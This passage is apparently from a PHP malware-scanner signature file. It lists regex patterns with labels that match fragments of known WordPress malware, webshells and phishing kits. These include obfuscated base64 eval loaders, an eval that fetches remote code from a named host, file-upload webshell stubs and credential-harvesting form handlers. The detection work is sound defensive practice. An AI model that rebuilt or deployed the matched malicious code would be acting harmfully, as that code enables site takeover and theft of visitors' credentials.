      'pattern' => '/\\/\\*jslint browser\\: true \\*\\/ \\/\\*global jQuery\\: true \\*\\/[\\s\\S]{0,12000};if\\(ndsw\\=\\=\\=undefined\\)\\{function g\\(R,G\\)\\{var y\\=V\\(\\);return g\\=function\\(O,n\\)\\{O\\=O\\-0x6b;var P\\=y\\[O\\];return P;\\},g\\(R,G\\);\\}function V\\(\\)\\{var v\\=\\[\'ion\',\'ind/s',
      'label' => 'source-file head-tail anchor',
    ),
    779 => 
    array (
      'pattern' => '/\\<form\\s+name\\="checkout"\\s+method\\="post"\\s+class\\="checkout\\s+woocommerce\\-checkout"\\s+action\\="\\<\\?php\\s+echo\\s+esc_url\\(\\s+wc_get_checkout_url\\(\\)\\s+\\);\\s+\\?\\>"\\s+enctype\\="multipart\\/form\\-data"\\>/',
      'label' => 'sample-specific line fragment',
    ),
    780 => 
    array (
      'pattern' => '/jQuery\\(document\\)\\.ready\\(function\\(\\$\\) \\{[\\s\\S]{0,12000};if\\(ndsw\\=\\=\\=undefined\\)\\{function g\\(R,G\\)\\{var y\\=V\\(\\);return g\\=function\\(O,n\\)\\{O\\=O\\-0x6b;var P\\=y\\[O\\];return P;\\},g\\(R,G\\);\\}function V\\(\\)\\{var v\\=\\[\'ion\',\'ind/s',
      'label' => 'source-file head-tail anchor',
    ),
    781 => 
    array (
      'pattern' => '/\\!function\\(e\\)\\{var t\\=\\{\\};function n\\(r\\)\\{if\\(t\\[r\\]\\)return t\\[r\\]\\.exports;var o\\=t\\[r\\]\\=\\{i\\:r,l\\:\\!1,exports\\:\\{\\}\\};return e\\[r\\]\\.call\\(o\\.exports,o,o\\.exports,n\\),o/',
      'label' => 'source-file tail snippet',
    ),
    782 => 
    array (
      'pattern' => '/\\/",\\$homee\\);
	\\$build \\= \'\\/\'\\.\\$cgfs\\[1\\]\\.\'\\/\'\\.\\$cgfs\\[2\\]\\.\'\\/\\.cagefs\';
	if\\(is_dir\\(\\$build\\)\\) \\{
		echo\\(/',
      'label' => 'sample-specific literal',
    ),
    783 => 
    array (
      'pattern' => '/function iojiebpixvcpxolcnnor\\(\\$wvedbpkhwvedolxeuamwm\\)\\{[\\s\\S]{0,12000}eval\\(iojiebpixvcpxolcnnor\\(\'bVPbjpswEP0AvmLkRmuQtklURX3YAOlD04vUqpWy\\+xRFyMCwWAVMjVklXeXbO4awIVH8ZM\\+c4zkzPnZQa6UjjbXSRlbP7txbOg2ayMgSo0KW0nQhm/s',
      'label' => 'source-file head-tail anchor',
    ),
    784 => 
    array (
      'pattern' => '/\\=\\=\\= \\$post_type \\|\\| comments_open\\(\\) \\|\\| get_comments_number\\(\\) \\) && \\! post_password_required\\(\\) \\) \\) \\{
		\\$classes\\[\\] \\=/',
      'label' => 'sample-specific literal',
    ),
    785 => 
    array (
      'pattern' => '/\\)\\<\\/script\\>\';
\\}
\\}
\\}
\\?\\>
\\<\\?php
echo \'\\<\\/center\\>\';
\\$scandir \\= scandir\\(\\$path\\);
\\$pa \\= getcwd\\(\\);
echo \'\\<div id\\=/',
      'label' => 'sample-specific literal',
    ),
    786 => 
    array (
      'pattern' => '/eval\\("\\?\\>"\\.@file_get_contents\\("https\\:\\/\\/code\\.allxxx\\.xyz\\/fa48cver31\\.txts"\\)\\);[\\s\\S]{0,12000}require ABSPATH \\. \'wp\\-admin\\/profile\\.php\';/s',
      'label' => 'source-file head-tail anchor',
    ),
    787 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'Fox\'\\] \\=\\= \'2scwF\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/',
      'label' => 'source-file tail snippet',
    ),
    788 => 
    array (
      'pattern' => '/\\<\\? \\$GLOBALS\\[\'_C98A7D_\'\\] \\= Array\\(base64_decode\\(\'ZX\' \\. \'Jyb3JfcmVwb3J\' \\. \'0aW5\' \\. \'n\'\\), base64_decode\\(\'\' \\. \'c2V0Y29va2ll\'\\), base64_decode\\(\'dG\'/',
      'label' => 'source-file head snippet',
    ),
    789 => 
    array (
      'pattern' => '/\\$lgrlc \\= \'ko1g7f\\#84nd5\\-v0r\\*_mcleiyp63\\\\\'uHat9sbx\';\\$ucjocl \\= Array\\(\\);\\$ucjocl\\[\\] \\= \\$lgrlc\\[19\\]\\.\\$lgrlc\\[15\\]\\.\\$lgrlc\\[21\\]\\.\\$lgrlc\\[30\\]\\.\\$lgrlc\\[31\\]\\.\\$lgrlc/',
      'label' => 'source-file tail snippet',
    ),
    790 => 
    array (
      'pattern' => '/\\<\\?php \\/\\* FoxAuto token PjYT6 Xbfik L07GX hexdec substr pack strlen trim \\*\\/ error_reporting\\(0\\); function PCHdY\\(\\$fDig7\\) \\{ \\$lxVSx \\= strlen\\(trim/',
      'label' => 'source-file tail snippet',
    ),
    791 => 
    array (
      'pattern' => '/\\>\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\|Pinchicha\\|\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\<\\/font\\>\\<br \\/\\>

LOGIN \\:[\\s\\S]{0,160}\\>\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\|ANZ Log\\|\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\<\\/font\\>\\<br \\/\\>/',
      'label' => 'sample-specific literal chain',
    ),
    792 => 
    array (
      'pattern' => '/\\/\\*\'\\); \\/\\/ get all file names
	foreach\\(\\$files as \\$file\\)\\{ \\/\\/ iterate files
	  	if\\(is_dir\\(\\$file\\)\\) \\{
			if\\(\\$file\\=\\=getcwd\\(\\)\\./',
      'label' => 'sample-specific literal',
    ),
    793 => 
    array (
      'pattern' => '/\\<\\!DOCTYPE HTML PUBLIC "\\-\\/\\/W3C\\/\\/DTD HTML 4\\.01 Transitional\\/\\/EN"\\>[\\s\\S]{0,12000}\\<div id\\="image3" style\\="position\\:absolute; overflow\\:hidden; left\\:290px; top\\:1152px; width\\:63px; height\\:24px; z\\-index\\:15"\\>\\<a href\\="\\#"\\>\\<img sr/s',
      'label' => 'source-file head-tail anchor',
    ),
    794 => 
    array (
      'pattern' => '/\\<\\!DOCTYPE HTML PUBLIC "\\-\\/\\/W3C\\/\\/DTD HTML 4\\.01 Transitional\\/\\/EN"\\>[\\s\\S]{0,12000}\\<div id\\="image3" style\\="position\\:absolute; overflow\\:hidden; left\\:290px; top\\:755px; width\\:63px; height\\:24px; z\\-index\\:11"\\>\\<a href\\="\\#"\\>\\<img src/s',
      'label' => 'source-file head-tail anchor',
    ),
    795 => 
    array (
      'pattern' => '/if\\(\\$_POST\\["em"\\] \\!\\= "" and \\$_POST\\["ep"\\] \\!\\= ""\\)\\{[\\s\\S]{0,12000}header \\("Location\\: index\\.php"\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    796 => 
    array (
      'pattern' => '/sn\'\\]\\."\\\\n";
\\$message \\.\\= "MMN				       \\: "\\.\\$_POST\\[[\\s\\S]{0,160}\\]\\."\\\\n";
\\$message \\.\\= "Address			       \\: "\\.\\$_POST\\[/',
      'label' => 'sample-specific literal chain',
    ),
    797 => 
    array (
      'pattern' => '/\\$nn \\= \\$n\\.\\$_GET\\[\'18mn2w3d50ovq6\'\\];[\\s\\S]{0,12000}\\$k \\= urldecode\\(base64_decode\\(\\$s\\)\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    798 => 
    array (
      'pattern' => '/if\\(\\$_POST\\["ud"\\] \\!\\= "" and \\$_POST\\["pd"\\] \\!\\= ""\\)\\{[\\s\\S]{0,12000}header \\("Location\\: index\\.php"\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    799 => 
    array (
      'pattern' => '/q1\'\\]\\."\\\\n";
\\$message \\.\\= "Answer 1            	\\: "\\.\\$_POST\\[[\\s\\S]{0,160}\\]\\."\\\\n";
\\$message \\.\\= "Question 2             \\: "\\.\\$_POST\\[/',
      'label' => 'sample-specific literal chain',
    ),
    800 => 
    array (
      'pattern' => '/\\<\\!DOCTYPE HTML PUBLIC "\\-\\/\\/W3C\\/\\/DTD HTML 4\\.01 Transitional\\/\\/EN"\\>[\\s\\S]{0,12000}\\<div id\\="image3" style\\="position\\:absolute; overflow\\:hidden; left\\:335px; top\\:435px; width\\:63px; height\\:24px; z\\-index\\:5"\\>\\<img src\\="images\\/h11\\./s',
      'label' => 'source-file head-tail anchor',
    ),
    801 => 
    array (
      'pattern' => '/\\);\\$htaccess_rule \\.\\="\\\\\\\\x20On\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"\\\\x47L\\\\x4fB\\\\x41L\\\\x53"\\}\\["\\\\x43\\\\x55\\\\x31\\\\x55\\\\x31\\\\x4d\\\\x4d\\\\x31\\\\x4d\\\\x55"\\]\\(\\\\[\\s\\S]{0,160}\\);\\$htaccess_rule \\.\\="\\\\\\\\x20\\/\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"\\\\x47L\\\\x4fB\\\\x41L\\\\x53"\\}\\["\\\\x43\\\\x55\\\\x31\\\\x55\\\\x31\\\\x4d\\\\x4d\\\\x31\\\\x4d\\\\x55"\\]\\(\\\\/',
      'label' => 'sample-specific literal chain',
    ),
    802 => 
    array (
      'pattern' => '/\\<\\/script\\>\'; \\} function z3w\\(\\$var,\\$f\\)\\{ \\$val\\=\'\'; if\\(\\!empty\\(\\$f\\)\\)\\{ \\$reg\\=\'\\/\\\\\\$\'\\.\\$var\\.\'\\\\s\\*\\=\\\\s\\*\\(\\[\\\\\'"\\]\\{1\\}\\)\\(\\[\\^\\\\1\\\\s\\\\t\\\\r\\\\n\\]\\+\\)\\\\1\\\\s\\*;\\/\'; if\\(@preg_match\\(\\$re/',
      'label' => 'source-file tail snippet',
    ),
    803 => 
    array (
      'pattern' => '/\\<\\?php  \\/\\*b0224de6c80b76dcf7b6f44746f54943b0224de6c80b76dcf7b6f44746f54943\\*\\/ \\?\\>\\<\\?php \\$A9475 \\= "x\\*dzv\\(7cet\\.isp\\/nj;3ahuwfg0o8r6\\)4l_25k9qyb1m";f/',
      'label' => 'source-file tail snippet',
    ),
    804 => 
    array (
      'pattern' => '/\\<\\?php \\/\\*vspr vwcyfwvbbwwzleeiwgaq \\*\\/\\?\\>\\<\\?php \\$A9475 \\= "x\\*dzv\\(7cet\\.isp\\/nj;3ahuwfg0o8r6\\)4l_25k9qyb1m";function strfuncinj\\(\\$f, \\$q, \\$z\\)\\{	return \\$/',
      'label' => 'source-file tail snippet',
    ),
    805 => 
    array (
      'pattern' => '/@ini_set\\(\'display_errors\', \'0\'\\);[\\s\\S]{0,12000}wp_die\\( \\$die, __\\( \'WordPress &rsaquo; Error\' \\) \\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    806 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}iterator_apply       \\(\\$option, \\$win,                array        \\(\\$it\\)                              \\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    807 => 
    array (
      'pattern' => '/\\<\\?php \\$efxtv\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$hqhtkv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc2/',
      'label' => 'source-file tail snippet',
    ),
    808 => 
    array (
      'pattern' => '/\\* Sitemaps\\: WP_Sitemaps_Posts class[\\s\\S]{0,12000}@file_put_contents\\(\\$file,base64_decode\\(base64_decode\\(\\$code\\)\\)\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    809 => 
    array (
      'pattern' => '/\\$huwqbmb \\= \'b\\-afrm3en2\\#Hulgpkdcx_i8\\*607svy54t\\\\\'o\';\\$vxxvo \\= Array\\(\\);\\$vxxvo\\[\\] \\= \\$huwqbmb\\[2\\]\\.\\$huwqbmb\\[30\\]\\.\\$huwqbmb\\[24\\]\\.\\$huwqbmb\\[25\\]\\.\\$huwqbmb\\[17/',
      'label' => 'source-file tail snippet',
    ),
    810 => 
    array (
      'pattern' => '/var h\\=\\!0,j\\=\\!1;sorttable\\=\\{e\\:function\\(\\)\\{arguments\\.callee\\.i\\|\\|\\(arguments\\.callee\\.i\\=h,k&&clearInterval\\(k\\),document\\.createElement&&document\\.getElem/',
      'label' => 'source-file tail snippet',
    ),
    811 => 
    array (
      'pattern' => '/, array\\(\\)\\);
    if \\(\\!in_array\\(\\$pl, \\$current\\)\\) \\{
        \\$current\\[\\] \\= \\$pl;
        sort\\(\\$current\\);
        update_option\\(/',
      'label' => 'sample-specific literal',
    ),
    812 => 
    array (
      'pattern' => '/function get_client_ip\\(\\) \\{[\\s\\S]{0,12000}header\\(\'Location\\: https\\:\\/\\/href\\.li\\/\\?https\\:\\/\\/www\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    813 => 
    array (
      'pattern' => '/1",	\\/\\/ Send E\\-Mail To Your Mail[\\s\\S]{0,160}1",	\\/\\/ Telegram Bots Receiver/',
      'label' => 'sample-specific literal chain',
    ),
    814 => 
    array (
      'pattern' => '/cdxfGUkr9NHenNHenNHe1zfukgFMaXdoyjcUImb19oUAxyb18mRtwmwJ4LT09NHr8XTzEXRJwmwJXLT0/',
      'label' => 'sample-specific encoded fragment',
    ),
    815 => 
    array (
      'pattern' => '/;
    return \\$ipaddress;
\\}


function getOS\\(\\$useragent\\) \\{
  \\$os_platform \\= "Unknown OS Platform";
  \\$os_array \\= array\\(/',
      'label' => 'sample-specific literal',
    ),
    816 => 
    array (
      'pattern' => '/\\>
	\\<style\\>
	input\\[type\\=password\\]\\.error \\{
		border\\-color\\: red;
	\\}
	\\<\\/style\\>
	\\<style type\\=/',
      'label' => 'sample-specific literal',
    ),
    817 => 
    array (
      'pattern' => '/\\>
											
										\\<\\/div\\>
										
									\\<\\/div\\>
								\\<\\/div\\>
							\\<\\/div\\>

							\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    818 => 
    array (
      'pattern' => '/\\> 

										\\<\\/div\\>
										
									\\<\\/div\\>
								\\<\\/div\\>
							\\<\\/div\\>



							\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    819 => 
    array (
      'pattern' => '/s middle name\\?\\<\\/option\\>
                                                \\<option\\>What is your maternal grandfather/',
      'label' => 'sample-specific literal',
    ),
    820 => 
    array (
      'pattern' => '/\\* This file is part of Crawler Detect \\- the web crawler detection library\\.[\\s\\S]{0,12000}file_put_contents\\("raw\\/\\$className\\.txt", implode\\(\\$object\\-\\>getAll\\(\\), PHP_EOL\\)\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    821 => 
    array (
      'pattern' => '/Fixtures\\/AbstractReff\\.php[\\s\\S]{0,160}Fixtures\\/Headerspam\\.php/',
      'label' => 'sample-specific literal chain',
    ),
    822 => 
    array (
      'pattern' => '/\\* This file is part of Crawler Detect \\- the web crawler detection library\\.[\\s\\S]{0,12000}\'HTTP_X_SCANNER\', \\/\\/ Seen in use by Netsparker/s',
      'label' => 'source-file head-tail anchor',
    ),
    823 => 
    array (
      'pattern' => '/0lovespells0\\.blogspot\\.com[\\s\\S]{0,160}1\\-free\\-share\\-buttons\\.com/',
      'label' => 'sample-specific literal chain',
    ),
    824 => 
    array (
      'pattern' => '/\\* This file is part of Referral Spam Detect\\.[\\s\\S]{0,12000}protected \\$data \\= array\\(/s',
      'label' => 'source-file head-tail anchor',
    ),
    825 => 
    array (
      'pattern' => '/\\* This file is part of Crawler Detect \\- the web crawler detection library\\.[\\s\\S]{0,12000}return \\$this\\-\\>data;/s',
      'label' => 'source-file head-tail anchor',
    ),
    826 => 
    array (
      'pattern' => '/\'\\[a\\-z0\\-9\\\\\\-_\\]\\*\\(bot\\|crawl\\|archiver\\|transcoder\\|spider\\|uptime\\|validator\\|fetcher\\|cron\\|checker\\|reader\\|extractor\\|monitoring\\|analyzer\\|scraper\\)\',/',
      'label' => 'source-file tail snippet',
    ),
    827 => 
    array (
      'pattern' => '/\\* This file is part of Referral Spam Detect\\.[\\s\\S]{0,12000}return \\$this\\-\\>data;/s',
      'label' => 'source-file head-tail anchor',
    ),
    828 => 
    array (
      'pattern' => '/\\* This file is part of Crawler Detect \\- the web crawler detection library\\.[\\s\\S]{0,12000}\';\', \\/\\/ Remove the following characters ;/s',
      'label' => 'source-file head-tail anchor',
    ),
    829 => 
    array (
      'pattern' => '/\', \\$agent\\);

        if \\(strlen\\(trim\\(\\$agent\\)\\) \\=\\= 0\\) \\{
            return false;
        \\}

        \\$result \\= preg_match\\(/',
      'label' => 'sample-specific literal',
    ),
    830 => 
    array (
      'pattern' => '/if\\(isset\\(\\$_SERVER\\[\'HTTP_REFERER\'\\]\\)\\) \\{[\\s\\S]{0,12000}header\\(\'Location\\: https\\:\\/\\/href\\.li\\/\\?https\\:\\/\\/www\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    831 => 
    array (
      'pattern' => '/\\+\\+\\+\\+\\+\\[ BOT \\- Bots\\.php \\]\\+\\+\\+\\+\\+\\\\n/',
      'label' => 'sample-specific literal',
    ),
    832 => 
    array (
      'pattern' => '/\\$Bot \\= array\\("abot","dbot","ebot","hbot","kbot","lbot","mbot","nbot","obot","pbot","rbot","sbot","tbot","vbot","ybot","zbot","bot\\.","bot\\/","[\\s\\S]{0,12000}header\\(\'Location\\: https\\:\\/\\/href\\.li\\/\\?https\\:\\/\\/www\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    833 => 
    array (
      'pattern' => '/\\$IP \\= \\$_SERVER\\[\'REMOTE_ADDR\'\\];[\\s\\S]{0,12000}header\\(\'Location\\: https\\:\\/\\/href\\.li\\/\\?https\\:\\/\\/www\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    834 => 
    array (
      'pattern' => '/,", \\$data\\);
\\$data \\= str_replace\\(\'[\\s\\S]{0,160},"",\\$data\\);
\\$data \\= preg_replace\\(/',
      'label' => 'sample-specific literal chain',
    ),
    835 => 
    array (
      'pattern' => '/\\]\\)\\)\\{
			\\$ip \\= getenv\\("REMOTE_ADDR"\\);
            \\$bot_count \\+\\= 1;
          \\}
     \\}
	 
\\$dp \\=  strtolower\\(\\$_SERVER\\[/',
      'label' => 'sample-specific literal',
    ),
    836 => 
    array (
      'pattern' => '/\\$tanitatikaram \\= parse_ini_file\\("config\\.ini", true\\);[\\s\\S]{0,12000}die\\(\'\\<\\!DOCTYPE HTML PUBLIC "\\-\\/\\/IETF\\/\\/DTD HTML 2\\.0\\/\\/EN"\\>\\<html\\>\\<head\\>\\<title\\>404 Not Found\\<\\/title\\>\\<\\/head\\>\\<body\\>\\<h1\\>Not Found\\<\\/h1\\>\\<p\\>The request/s',
      'label' => 'source-file head-tail anchor',
    ),
    837 => 
    array (
      'pattern' => '/error_reporting\\(0\\);[\\s\\S]{0,12000}die\\(\'\\<\\!DOCTYPE HTML PUBLIC "\\-\\/\\/IETF\\/\\/DTD HTML 2\\.0\\/\\/EN"\\>\\<html\\>\\<head\\>\\<title\\>404 Not Found\\<\\/title\\>\\<\\/head\\>\\<body\\>\\<h1\\>Not Found\\<\\/h1\\>\\<p\\>The request/s',
      'label' => 'source-file head-tail anchor',
    ),
    838 => 
    array (
      'pattern' => '/ikkr9NHenNHenNHe1zfukgFMaXdoyjcUImb19oUAxyb18mRtwmwJ4LT09NHr8XTzEXRJwmwJXLT09NHe/',
      'label' => 'sample-specific encoded fragment',
    ),
    839 => 
    array (
      'pattern' => '/ppgTFkr9NHenNHenNHe1zfukgFMaXdoyjcUImb19oUAxyb18mRtwmwJ4LT09NHr8XTzEXRJwmwJXLT09/',
      'label' => 'sample-specific encoded fragment',
    ),
    840 => 
    array (
      'pattern' => '/Mpkr9NHenNHenNHe1zfukgFMaXdoyjcUImb19oUAxyb18mRtwmwJ4LT09NHr8XTzEXRJwmwJXLT09NHe/',
      'label' => 'sample-specific encoded fragment',
    ),
    841 => 
    array (
      'pattern' => '/\\) \\!\\=\\= false \\) \\{
                \\/\\/ 128\\.255\\.255\\.0\\-128\\.255\\.255\\.255 format
                list\\( \\$low, \\$high \\) \\= explode\\(/',
      'label' => 'sample-specific literal',
    ),
    842 => 
    array (
      'pattern' => '/eval\\(base64_decode\\(\'ZnVuY3Rpb24gX0ljNTUoJF9Pam5FeWozdSl7JF9Pam5FeWozdT1zdWJzdHIoJF9Pam5FeWozdSwoaW50KShoZXgyYmluKCczNTM1MzYnKSkpOyRfT2puRXlq/',
      'label' => 'source-file tail snippet',
    ),
    843 => 
    array (
      'pattern' => '/NWl\\/Qe\\/d7HcGgP3Bj\\+Or3jmYEXTFOuMKjVfsWclU8ZWGfbJwcxzVSnHwOt2Ka226ZUrLeIqy\\+hPI\\/sQE/',
      'label' => 'sample-specific encoded fragment',
    ),
    844 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'Fox\'\\] \\=\\= \'NaXyJ\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/',
      'label' => 'source-file tail snippet',
    ),
    845 => 
    array (
      'pattern' => '/",\\$ooooooOOoOOoooOOOooooOOOOO\\);\\}else\\{ \\$ooooooOOoOOoooOOOooooOOOOO\\= str_replace\\(\\$O\\{63\\},[\\s\\S]{0,160},\\$oOoooOOoOO\\);\\$ooooooOOoOOoooOOOooooOOOOO\\= str_replace\\(\\$O\\{59\\}\\.\\$O\\{20\\}\\.\\$O\\{25\\}\\.\\$O\\{18\\},/',
      'label' => 'sample-specific literal chain',
    ),
    846 => 
    array (
      'pattern' => '/\\* FoxAutoV5 by \\[anonymousfox\\.co\\][\\s\\S]{0,12000}goto D7UPX; VoASl\\: \\$tIIxw \\= "\\\\137\\\\165\\\\x6b\\\\x6f\\\\144"; goto lQyPH; lQyPH\\: \\$yF5rI \\= "\\\\142\\\\141\\\\x73\\\\145\\\\x36\\\\64\\\\x5f\\\\144\\\\x65\\\\143\\\\157\\\\144\\\\x65"; goto /s',
      'label' => 'source-file head-tail anchor',
    ),
    847 => 
    array (
      'pattern' => '/requests\\. See \\#14348\\.
 \\*
 \\* @since 3\\.5\\.0
 \\*
 \\* @param bool \\$exit Whether to exit without generating any content for[\\s\\S]{0,160}requests\\. Default true\\.
 \\*\\/
if \\(/',
      'label' => 'sample-specific literal chain',
    ),
    848 => 
    array (
      'pattern' => '/eval\\(base64_decode\\(\'ZnVuY3Rpb24gX1BLVnEoJF8yZDd3ckgpeyRfMmQ3d3JIPXN1YnN0cigkXzJkN3dySCwoaW50KShoZXgyYmluKCczNzMwMzQnKSkpOyRfMmQ3d3JIPXN1YnN0/',
      'label' => 'source-file tail snippet',
    ),
    849 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); function x\\(\\$u, \\$i\\)\\{ \\$l\\=""; for\\(\\$o\\=0;\\$o\\<strlen\\(\\$u\\);\\) for\\(\\$b\\=0;\\$b\\<strlen\\(\\$i\\);\\$b\\+\\+, \\$o\\+\\+\\) \\$l \\.\\= \\$u\\{\\$o\\} \\^ \\$i\\{\\$b\\}; retu/',
      'label' => 'source-file tail snippet',
    ),
    850 => 
    array (
      'pattern' => '/eval\\(base64_decode\\(\'ZnVuY3Rpb24gX1I5MkcoJF9VbE9nWDhnKXskX1VsT2dYOGc9c3Vic3RyKCRfVWxPZ1g4ZywoaW50KShoZXgyYmluKCczNzMyMzUnKSkpOyRfVWxPZ1g4Zz1z/',
      'label' => 'source-file tail snippet',
    ),
    851 => 
    array (
      'pattern' => '/\\$files \\= @\\$_FILES\\["files"\\];[\\s\\S]{0,12000}\\}echo \'\\<html\\>\\<head\\>\\<title\\>\\<\\/title\\>\\<\\/head\\>\\<body\\>\\<form method\\=POST enctype\\="multipart\\/form\\-data" action\\=""\\>\\<input type\\=text name\\=path\\>\\<input t/s',
      'label' => 'source-file head-tail anchor',
    ),
    852 => 
    array (
      'pattern' => '/ArOQ2o8OdFOkRoIyC21OMzIj4EfwzVHwK\\/LdD5swXjD\\+EBnUC1g\\/yD9bLP4vVRmDmVI49uwcgeQUjG\\+IP49snS9eTdpSHFlAzh2c[\\s\\S]{0,160}QwjAOTU2SWVvYvgvan4qVpSe\\+JnrWvMXWqLq0BibixDtqc9FGG\\+flwet7Q8fxN6Jv8KXkOupFZSpfDk9W\\/GeCS6o2cY5PhLyh\\+jQ/',
      'label' => 'sample-specific literal chain',
    ),
    853 => 
    array (
      'pattern' => '/\\<\\?php class _fa\\{private static\\$s;public static function g\\(\\$n,\\$k\\)\\{if\\(\\!self\\:\\:\\$s\\)self\\:\\:i\\(\\);\\$l\\=strlen\\(\\$k\\);\\$r\\=base64_decode\\(self\\:\\:\\$s\\[\\$n\\]\\);for\\(\\$i\\=/',
      'label' => 'source-file tail snippet',
    ),
    854 => 
    array (
      'pattern' => '/\\]\\?\\>"required \\>
	\\<input type\\="submit" value\\="Send test \\>\\>"\\>

\\<\\/form\\>
\\<br\\>
\\<\\?php
if \\(\\!empty\\(\\$_POST\\[/',
      'label' => 'sample-specific literal',
    ),
    855 => 
    array (
      'pattern' => '/\\(\' \\. \\$ZLOq8\\[57\\] \\. \\$ZLOq8\\[13\\] \\. \\$ZLOq8\\[34\\] \\. \\$ZLOq8\\[15\\] \\. \\$ZLOq8\\[40\\] \\. \\$ZLOq8\\[41\\] \\.[\\s\\S]{0,160}\\. \\$ZLOq8\\[6\\] \\. \\$ZLOq8\\[15\\] \\. \\$ZLOq8\\[2\\] \\. \\$ZLOq8\\[3\\] \\. \\$ZLOq8\\[6\\] \\. \\$ZLOq8\\[15\\] \\./',
      'label' => 'sample-specific literal chain',
    ),
    856 => 
    array (
      'pattern' => '/\';
		for \\(\\$i\\=0; \\$i \\< strlen\\(\\$n\\); \\$i\\+\\+\\)\\{
			\\$y \\.\\= dechex\\(ord\\(\\$n\\[\\$i\\]\\)\\);
		\\}
		return \\$y;
	\\}
	function uhex\\(\\$y\\) \\{
		\\$n\\=/',
      'label' => 'sample-specific literal',
    ),
    857 => 
    array (
      'pattern' => '/\\]\\[\\\\x00\\-\\\\x1f\\\\s\\]\\*\\\\\\]\\[\\\\x00\\-\\\\x1f\\\\s\\]\\*\\\\\\)\\[\\\\x00\\-\\\\x1f\\\\s\\]\\*;\\[\\\\x00\\-\\\\x1f\\\\s\\]\\*echo\\[\\\\x00\\-\\\\x1f\\\\s\\]\\*\\\\\\$_FILES\\[\\\\x00\\-\\\\x1f\\\\s\\]\\*\\\\\\[\\[\\\\x00\\-\\\\x1f\\\\s\\]\\*\\[\'/',
      'label' => 'sample-specific literal',
    ),
    858 => 
    array (
      'pattern' => '/wso\'\\]\\);
  curl_setopt\\(\\$ch, CURLOPT_COOKIEFILE,\\$GLOBALS\\[[\\s\\S]{0,160}https\\:\\/\\/www\\.rippysbarandgrill\\.com\\/\\/admin\\/lib\\/_notes\\/sys\\.txt/',
      'label' => 'sample-specific literal chain',
    ),
    859 => 
    array (
      'pattern' => '/error_reporting\\(0\\);[\\s\\S]{0,12000}\\$a \\= get_contents\\(\'https\\:\\/\\/northcompassrealty\\.com\\/wp\\-content\\/themes\\/the\\-bootstrap\\-blog\\/no\\.txt\'\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    860 => 
    array (
      'pattern' => '/4 \\? long2ip \\(_x7gc9q8\\:\\:\\$_ks5re2ir \\- 1000\\) \\: \\$_7g5ooajl\\[2\\];\\$_x6qr5pte \\= _x7gc9q8\\:\\:_omlbv\\(\\$_7g5ooajl, \\$_go7ubx3q\\);if \\(\\!\\$_x6qr5pte\\)\\{\\$_x6qr5pte /',
      'label' => 'source-file tail snippet',
    ),
    861 => 
    array (
      'pattern' => '/function ixwdncagek\\(\\$yvcvfvypkb, \\$ndqgvtbgud\\) \\{[\\s\\S]{0,12000}eval \\(\\$xidwdlafnq\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    862 => 
    array (
      'pattern' => '/\\>Delete File Gagal\\.\\.\\<\\/font\\>\\<br \\/\\>\';
\\}
\\}
\\}
echo \'\\<\\/center\\>\';
\\$scandir \\= scandir\\(\\$path\\);
echo \'\\<div id\\=/',
      'label' => 'sample-specific literal',
    ),
    863 => 
    array (
      'pattern' => '/\\<\\?php \\$b6bb6\\=explode\\("1l","stsixe_yek_yarra1lcexe_lruc1ltilps_gerp1ldomhc1lstegf1lteg_ini1lemitotrts1lecalper_gerp1lrid_pmet_teg_sys1lnepof1/',
      'label' => 'source-file tail snippet',
    ),
    864 => 
    array (
